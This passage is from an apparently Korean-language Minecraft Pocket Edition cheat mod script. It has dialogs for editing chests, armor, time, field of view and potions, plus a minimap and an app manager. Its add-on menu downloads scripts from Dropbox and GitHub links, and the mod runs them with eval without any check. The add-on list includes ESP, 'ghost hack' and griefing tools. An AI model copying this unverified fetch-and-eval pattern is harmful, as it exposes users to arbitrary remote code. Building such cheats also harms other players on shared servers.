if(Dark.readAddOn("setTileManager")!="")
eval(Dark.readAddOn("setTileManager"));
else
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}
}


function showSetTiles(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx)
layout.setOrientation(1);
var text = new android.widget.TextView(ctx);
if(tf) text.setText(particleString);
else text.setText(setTileString);
text.setTextColor(white);
text.setTextSize(17);
layout.addView(text);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
if(tf) dialog.setTitle("파티클 도우미");
else dialog.setTitle("setTile 메니저");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("SD 카드에 저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(tf) selectDir(sdcard, 3);
else selectDir(sdcard, 2);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function particleHelper(){
if(!w.tf){
Dark.toast("월드 에딧이 비활성화 되어있습니다.");
}
else if(!sm.tf){
Dark.toast("setTile 메니저가 비활성화 되어있습니다.");
}
else{
if(Dark.readAddOn("particleHelper")!="")
eval(Dark.readAddOn("particleHelper"));
else
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}
}


function selectAddOn(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("추가 파일 다운로드");
var menus = ["Smart Moving", "고급 테러", "건물 소환", "월드 에딧", "Dark Cheater ESP", "setTile 매니저", "파티클 도우미", "고스트핵", "Fire Editor", "Server Plugin", "NPC 마을"];
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
switch(w){
case 0 : 
Dark.downloadAddOn("https://www.dropbox.com/s/qr0b20lej5gixcw/smartMoving.txt?dl=1", "smartMoving");
break;
case 1 : 
Dark.toast("다운받을 수 없습니다.");
break;
case 2 : 
Dark.selectBuilding(true);
break;
case 3 : 
Dark.downloadAddOn("https://www.dropbox.com/s/b48w9yggc6f3krm/worldEdit.txt?dl=1", "worldEdit");
break;
case 4 : 
Dark.downloadAddOn("https://www.dropbox.com/s/onxpo3hnryh8inl/ESP.txt?dl=1", "ESP");
break;
case 5 : 
Dark.downloadAddOn("https://www.dropbox.com/s/p2hi8720t8y9m6b/setTileManager.txt?dl=1", "setTileManager");
break;
case 6 : 
Dark.downloadAddOn("https://www.dropbox.com/s/6h4t8qb7s032ixa/particleHelper.txt?dl=1", "particleHelper");
break;
case 7 : 
Dark.downloadAddOn("https://www.dropbox.com/s/fetotc0319bxumb/ghostHack.txt?dl=1", "ghostHack");
break;
case 8 : 
Dark.downloadAddOn("https://www.dropbox.com/s/gko5prz81u52lvg/fireEditor.txt?dl=1", "fireEditor");
break;
case 9 : 
Dark.downloadAddOn(GitHubLink+"serverPlugin.txt", "serverPlugin");
break;
case 10 : 
Dark.downloadAddOn("https://www.dropbox.com/s/sdnf0g3a0uv5ofk/villageData.txt?dl=1", "villageData");
break;
}
}
}));
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showChestList(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
Dark.toast(loadChestCount+"개의 창고를 불러왔습니다.");
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = [];
for(var n in loadChestData){
btns[n] = new android.widget.Button(ctx);
btns[n].setText("위치 : "+loadChestData[n][0][0]+", "+loadChestData[n][0][1]+", "+loadChestData[n][0][2]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
showChestData(v.getId());
}
});
layout.addView(btns[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("창고 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showChestData(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = [];
for(var n in loadChestData[nn][1]){
btns[n] = new android.widget.Button(ctx);
btns[n].setText("아이템 아이디 : "+loadChestData[nn][1][n][0]+", 개수 : "+loadChestData[nn][1][n][1]+", 데미지 : "+loadChestData[nn][1][n][2]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
editChestData(nn, v.getId(), btns[v.getId()]);
}
});
layout.addView(btns[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("창고 내용 수정("+loadChestData[nn][0][0]+", "+loadChestData[nn][0][1]+", "+loadChestData[nn][0][2]+")");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function editChestData(nn, n, btn, tf, arr){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var i, a, it;
if(tf){
if(arr[0][n][0]==undefined) i = 0;
else i = arr[0][n][0];
if(arr[0][n][1]==undefined) a = 0;
else a = arr[0][n][1];
if(arr[0][n][2]==undefined) it = 0;
else it = arr[0][n][2];
}
else{
if(loadChestData[nn][1][n][0]==undefined) i = 0;
else i = loadChestData[nn][1][n][0];
if(loadChestData[nn][1][n][1]==undefined) a = 0;
else a = loadChestData[nn][1][n][1];
if(loadChestData[nn][1][n][2]==undefined) it = 0;
else it = loadChestData[nn][1][n][2];
}
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("아이템 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number|number2);
loc2.setText(i+"");
loc3.setText("아이템 개수 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("아이템 개수를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number);
loc4.setText(a+"");
loc5.setText("아이템 데미지 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("아이템 데미지를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
loc6.setText(it+"");
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
Dark.noFullScreen(loc6);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("창고 내용 수정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(tf){
Level.setChestSlot(arr[1][0], arr[1][1], arr[1][2], n, Number(loc2.getText()), Number(loc6.getText()), Number(loc4.getText()));
}
else{
Level.setChestSlot(loadChestData[nn][0][0], loadChestData[nn][0][1], loadChestData[nn][0][2], n, Number(loc2.getText()), Number(loc6.getText()), Number(loc4.getText()));
loadChestData[nn][1][n] = [Number(loc2.getText()), Number(loc4.getText()), Number(loc6.getText())];
}
btn.setText("아이템 아이디 : "+loc2.getText()+", 개수 : "+loc4.getText()+", 데미지 : "+loc6.getText());
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectMap(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(sdcard+"/games/com.mojang/minecraftWorlds/").list().sort();
var dir2 = [];
for each(var ff in dir){
var fff = new java.io.File(sdcard+"/games/com.mojang/minecraftWorlds/"+ff);
if(ff.substring(0, 1)!="."&&fff.isDirectory()) dir2.push(ff);
}
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
ModPE.selectLevel(dir2[w]);
Dark.toast("이동합니다.");
}
}));
dialog.setTitle("다른 월드로 이동 - 맵 폴더 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showArmorList(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var menus = ["가죽 갑옷 세트", "사슬 갑옷 세트", "철 갑옷 세트", "다이아몬드 갑옷 세트", "금 갑옷 세트"];
var ids = [298, 302, 306, 310];
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
if(tf){
for(var n=0;n<4;n++)
addItemInventory(ids[w]+n, 1, 0);
Dark.toast(menus[w]+"이 지급되었습니다.");
}
else{
for(var n=0;n<4;n++)
Player.setArmorSlot(n, ids[w]+n, 0);
Dark.toast(menus[w]+"를 착용하였습니다.");
}
}
}));
dialog.setTitle("갑옷 종류 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function armorEdit(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuA = new android.widget.PopupWindow();
var title = makeTitle("갑옷 슬롯 수정", menuA);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = [];
var menus = ["투구", "윗옷", "바지", "신발"];
for(var n=0;n<4;n++){
btns[n] = makeButton(menus[n]+" ("+Player.getArmorSlot(n)+", "+Player.getArmorSlotDamage(n)+")");
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
loadArmor(v.getId());
}
});
layout.addView(btns[n]);
}
var fix = makeButton("갑옷 내구도 수리");
var ar = makeButton("갑옷 바로 입기");
fix.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
for(var n=0;n<4;n++)
Player.setArmorSlot(n, Player.getArmorSlot(n), 0);
Dark.toast("수리되었습니다.");
}
});
ar.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
showArmorList();
}
});
layout.addView(fix);
layout.addView(ar);
var exit = makeExit(menuA);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuA);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuA.setContentView(layout2);
menuA.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function loadArmor(type){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var menus = ["투구", "윗옷", "바지", "신발"];
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("아이템 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc2.setText(Player.getArmorSlot(type)+"");
loc3.setText("아이템 데미지 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("아이템 데미지를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number);
loc4.setText(Player.getArmorSlotDamage(type)+"");
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("갑옷 수정 - "+menus[type]);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Player.setArmorSlot(type, loc2.getText(), loc4.getText());
Dark.toast("수정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}}));
}


function makeMinecraftClock(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
clock2 = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(center);
clockSeek = new android.widget.SeekBar(ctx);
var tym = Level.getTime();
if(mcpev2){
clockSeek.setMax(24000);
while(tym>24000)
tym -= 24000;
}
else{
clockSeek.setMax(19200);
while(tym>19200)
tym -= 19200;
}
clockSeek.setProgress(tym);
clockSeek.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
Level.setTime(clockSeek.getProgress());
}
}));
setDragListenerForSeekBar(clock2, clockSeek, false);
layout.addView(clockSeek);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
clock2.setContentView(scroll);
clock2.setWidth(dip2px(ctx, 135));
clock2.setHeight(dip2px(ctx, 30));
clock2.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
if(Dark.read("mClockX")=="") clock2.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, 80, dip2px(ctx, 22));
else clock2.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("mClockX"), Dark.read("mClockY"));
}
else{
if(clock2!=null){
clock2.dismiss();
clock2 = null;
}
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function loadAppList(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var intent = new android.content.Intent(android.content.Intent.ACTION_MAIN, null);
intent.addCategory(android.content.Intent.CATEGORY_LAUNCHER);
var pm = ctx.getPackageManager();
var appList = pm.queryIntentActivities(intent, 0);
if(tf){
var names = [], list = [];
for(var n=0;n<appList.size();n++){
var pack = appList.get(n);
var appName = pack.loadLabel(pm).toString();
var packName = pack.activityInfo.applicationInfo.packageName;
if(appPack) names.push(appName+" ("+packName+")");
else names.push(appName);
list.push([appName, packName]);
}
names.sort();
list.sort();
dialog.setItems(names, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
appOption(list[w][1], names[w], pm);
}
}));
}
else{
var list = [];
for(var n=0;n<appList.size();n++){
var pack = appList.get(n);
list.push(pack.activityInfo.applicationInfo.packageName);
}
list.sort();
dialog.setItems(list, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
appOption(list[w], null, pm);
}
}));
}
dialog.setTitle("설치된 어플 보기");
dialog.setNegativeButton("취소", null);
dialog.show();
Dark.toast(appList.size()+"개의 어플을 불러왔습니다.");
}
catch(e){
Dark.showError(e);
}
}
}));
}


function appOption(pack, name, pm){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var menus = ["어플 실행", "어플 삭제"];
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
try{
switch(w){
case 0 : 
ctx.startActivity(pm.getLaunchIntentForPackage(pack.toString()));
if(name==null) Dark.toast(pack+"(을)를 실행합니다.");
else Dark.toast(name+"(을)를 실행합니다.");
break;
case 1 : 
ctx.startActivity(new android.content.Intent(android.content.Intent.ACTION_DELETE, android.net.Uri.fromParts("package", pack, null)));  //original sorce from Dark
break;
}
}
catch(e){
Dark.showError(e);
}
}
}));
if(name==null) dialog.setTitle("어플 관리 -"+pack);
else dialog.setTitle("어플 관리 - "+name);
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showModList(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
if(nn==1) var path = BlocklauncherRoot+"";
if(nn==2) var path = BlocklauncherRoot+".pro";
var dir = new java.io.File(path+"/app_ptpatches").list();
var dir2 = new java.io.File(path+"/app_Patches").list();
var dir3 = new java.io.File(sdcard+"/Android/data/com.snowbound.pockettool.free/Patches").list();
var dir4 = dir.concat(dir2, dir3).sort();
dialog.setItems(dir4, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
Dark.toast("열 수는 없습니다.");
}
}));
dialog.setTitle("적용된 모드 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.toast("루팅되어있지 않습니다.");
return;
Dark.showError(e);
}
}
}));
}


function openAnalogClock(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var clock = new android.widget.AnalogClock(ctx);
var pad = dip2px(ctx, 5);
clock.setPadding(pad, pad, pad, pad);
dialog.setView(clock);
dialog.setTitle("시계");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeMap(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var mr = Number(Dark.read("map"));
if(mr=="") mr = 30;
var map = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
selectDirectory(sdcard, mapData);
}
});
var mx, my, mz;
mx = Player.getX();
my = Player.getY()-2;
mz = Player.getZ();
var mapData = new android.graphics.Bitmap.createBitmap(2*mr*10, 2*mr*10, android.graphics.Bitmap.Config.ARGB_8888);
var canvas = new android.graphics.Canvas(mapData);
var p = new android.graphics.Paint();
for(var n=-mr;n<mr+1;n++){
for(var m=-mr;m<mr+1;m++){
for(var yy=my+5;yy>my-4;yy--){
var b = getTile(mx+n, yy, mz+m);
if(b!=0) break;
}
if(b==0) p.setARGB(0, 0, 0, 0);
else if(b==2||b==253||b==31||b==175||b==37||b==38||b==39||b==40) p.setARGB(255, 0, 255, 45);
else if(b==3||b==243||b==159||b==172||b==60||b==248||b==249) p.setARGB(255, 153, 109, 0);
else if(b==1||(b>=13&&b<=16)||b==4||b==21||b==48||b==82||b==98||b==110||b==129||b==139||b==61||b==62||b==245||b==67||b==71||b==73||b==74||b==109||b==255||b==101) p.setARGB(255, 120, 120, 120);
else if(b==8||b==9||b==22) p.setARGB(255, 0, 0, 255);
else if(b==79||b==174||b==247) p.setARGB(255, 160, 180, 255);
else if(b==5||b==17||b==32||b==47||b==53||b==54||b==58||b==63||b==64||b==65||b==68||b==85||b==107||b==134||b==135||b==136||b==157||b==158||b==162||b==163||b==164||b==183||b==184||b==185||b==186||b==187||b==96) p.setARGB(255, 164, 135, 81);
else if(b==6||b==18||b==81||b==83||b==103||b==104||b==105||b==106||b==111||b==120||b==133||b==141||b==142||b==161||b==244||b==254) p.setARGB(255, 64, 148, 0);
else if(b==10||b==11||b==51||b==26||b==27||b==46||b==152||b==246) p.setARGB(255, 255, 0, 0);
else if(b==12||b==24||b==19||b==41||b==89||b==121||b==170||b==198) p.setARGB(255, 255, 255, 0);
else if(b==86||b==91||b==127) p.setARGB(255, 255, 180, 0);
else if(b==57) p.setARGB(255, 0, 255, 255);
else if(b==87) p.setARGB(255, 150, 0, 0);
else if(b==45) p.setARGB(255, 150, 80, 65);
else if(b==20||b==30||b==35||b==42||b==43||b==44||b==78||b==80||b==92||b==95||b==102||b==126||b==155||b==156||b==171||b==50) p.setARGB(255, 255, 255, 255);
else p.setARGB(255, 0, 0, 0);
canvas.drawRect((n+mr)*10, (m+mr)*10, (n+mr+1)*10, (m+mr+1)*10, p);
}}
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(255, 0, 0, 0);
canvas.drawText("●", mr*10, mr*10, p);
var players2 = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players2.push(e);
}
var players = removeDouble(players2);
var px, pz;
for each(var pp in players){
px = Math.abs(mx-Entity.getX(pp));
pz = Math.abs(mz-Entity.getZ(pp));
if(px<=mr&&pz<=mr&&ad!=pp){
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(255, 255, 255, 255);
canvas.drawText("●", Math.round((mx-Entity.getX(pp))+mr)*10, Math.round((mz-Entity.getZ(pp))+mr)*10, p);
}
}
var back = new android.graphics.drawable.BitmapDrawable(mapData);
map.setContentView(layout);
map.setFocusable(true);
map.setWidth(ctx.getWindowManager().getDefaultDisplay().getHeight()*19/20);
map.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight()*19/20);
map.setBackgroundDrawable(back);
map.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectDirectory(path, bitmap){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list().sort();
var dir2 = [];
for each(var ff in dir){
var fff = new java.io.File(path+"/"+ff);
if(ff.substring(0, 1)!="."&&fff.isDirectory())
dir2.push(ff);
}
if(path!=sdcard) dir2.unshift("..");
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
var file = new java.io.File(path+"/"+dir2[w]);
if(w==0&&path!=sdcard){
selectDirectory(new java.io.File(path).getParent(), bitmap);
}
else{
selectDirectory(file, bitmap);
}
}
}));
dialog.setTitle("이미지 저장 - 폴더 선택");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
saveDialog(path, bitmap);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function saveDialog(path, bitmap){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc0 = new android.widget.TextView(ctx);
loc0.setText("이미지 종류 : ");
loc0.setTextSize(18);
loc0.setTextColor(white);
layout.addView(loc0);
var fileType = 0;
var types = ["PNG 이미지", "JPEG 이미지"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
fileType = p;
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("파일명 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("파일명을 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
switch(fileType){
case 0 : 
var file = new java.io.File(path+"/"+loc2.getText()+".png");
if(file.exists()){
fileExistsDialog(path, bitmap, file, "PNG");
return;
}
var fos = new java.io.FileOutputStream(file);
bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, fos);
fos.close();
break;
case 1 : 
var file = new java.io.File(path+"/"+loc2.getText()+".jpg");
if(file.exists()){
fileExistsDialog(path, bitmap, file, "JPEG");
return;
}
var fos = new java.io.FileOutputStream(file);
bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 100, fos);
fos.close();
break;
}
Dark.toast("저장되었습니다.");
}
}));
dialog.setTitle("이미지 저장 - 파일명 입력");
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function fileExistsDialog(path, bitmap, file, type){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("이미지 저장 - 덭어쓰기");
dialog.setMessage("해당 경로에 이미 파일이 존재합니다.");
dialog.setNegativeButton("이름 바꾸기", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
saveDialog(path, bitmap);
}
}));
dialog.setPositiveButton("덮어쓰기", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var fos = new java.io.FileOutputStream(file);
bitmap.compress(android.graphics.Bitmap.CompressFormat[type], 100, fos);
fos.close();
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeFovEditor(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
if(tf){
fovM = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(center);
var fovSeek = new android.widget.SeekBar(ctx);
fovSeek.setMax(200);
fovSeek.setMin(1);
fovSeek.setProgress(20);
fovSeek.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
ModPE.setFov(fovSeek.getProgress());
}
}));
setDragListenerForSeekBar(fovM, fovSeek, true);
layout.addView(fovSeek);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
fovM.setContentView(scroll);
fovM.setWidth(dip2px(ctx, 110));
fovM.setHeight(dip2px(ctx, 30));
fovM.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
if(Dark.read("mFovX")=="") fovM.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, 80, dip2px(ctx, 38));
else fovM.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("mFovX"), Dark.read("mFovY"));
}
else{
if(fovM!=null){
fovM.dismiss();
fovM = null;
}
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function openChest(x, y, z){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var i, a, it;
var data = [];
for(var n=0;n<27;n++){
i = Level.getChestSlot(x, y, z, n);
a = Level.getChestSlotCount(x, y, z, n);
it = Level.getChestSlotData(x, y, z, n);
data.push([i, a, it]);
}
var btns = [];
for(var n in data){
btns[n] = new android.widget.Button(ctx);
btns[n].setText("아이템 아이디 : "+data[n][0]+", 개수 : "+data[n][1]+", 데미지 : "+data[n][2]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
editChestData(null, v.getId(), btns[v.getId()], true, [data, [x, y, z]]);
}
});
layout.addView(btns[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("창고 내용 수정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function potionList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var code = null;
var types = ["포션 종류 선택", "야간 투시", "투명화", "도약", "화염저항", "신속", "구속", "수중호흡", "회복", "고통", "독", "재생", "힘", "나약함"];
var codes = [null, 5, 7, 9, 12, 14, 17, 19, 21, 23, 26, 28, 31, 34];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
code = codes[p];
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("개수 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("개수를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number|number2);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 지급");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(code!=null){
addItemInventory(373, loc2.getText(), code);
Dark.toast("지급되었습니다.");
}
else{
Dark.toast("포션 종류를 선택하지 않아서 지급되지 않습니다.");
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function opManager(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var cmds = [".day", ".night", ".tp", ".add", ".give", ".go", ".health", ".kill", ".call", ".heal", ".kick"];
var checks = [];
for(var n in cmds){
checks[n] = new android.widget.CheckBox(ctx);
